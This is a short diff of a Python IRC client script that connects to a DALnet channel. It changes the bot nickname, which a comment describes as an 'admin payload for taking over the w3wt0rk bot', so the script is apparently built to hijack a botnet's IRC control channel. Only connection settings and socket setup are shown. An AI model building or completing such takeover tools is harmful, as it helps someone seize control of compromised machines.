@@ -9,7 +9,7 @@ import sys
 #irc server connection settings
 server = "us.dal.net" #irc server
 channel = "#buhaypirata" #channel where the bot is located
-botnick = "botslayer" #admin payload for taking over the w3wt0rk bot
+botnick = "placeyouradminhere" #admin payload for taking over the w3wt0rk bot
 
 irc = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #defines the socket
 print "connecting to:"+server
